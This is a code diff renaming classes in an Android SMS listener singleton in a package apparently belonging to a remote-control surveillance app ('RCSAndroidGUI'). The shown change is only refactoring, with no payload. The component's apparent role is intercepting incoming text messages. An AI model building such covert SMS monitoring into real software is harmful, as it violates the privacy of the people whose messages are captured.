@@ -2,25 +2,25 @@ package com.ht.RCSAndroidGUI.listener;
 
 import com.ht.RCSAndroidGUI.Sms;
 
-public class SmsListener extends Listener<Sms> {
+public class ListenerSms extends Listener<Sms> {
 		/** The Constant TAG. */
 		private static final String TAG = "SmsListener";
 
-		private SmsBroadcastMonitor smsReceiver;
+		private BroadcastMonitorSms smsReceiver;
 
 		/** The singleton. */
-		private volatile static SmsListener singleton;
+		private volatile static ListenerSms singleton;
 
 		/**
 		 * Self.
 		 * 
 		 * @return the status
 		 */
-		public static SmsListener self() {
+		public static ListenerSms self() {
 			if (singleton == null) {
-				synchronized (SmsListener.class) {
+				synchronized (ListenerSms.class) {
 					if (singleton == null) {
-						singleton = new SmsListener();
+						singleton = new ListenerSms();
 					}
 				}
 			}
@@ -42,6 +42,6 @@ public class SmsListener extends Listener<Sms> {
 		 * Register the SMS monitor.
 		 */
 		private void registerSms() {
-			smsReceiver = new SmsBroadcastMonitor();
+			smsReceiver = new BroadcastMonitorSms();
 		}
 }
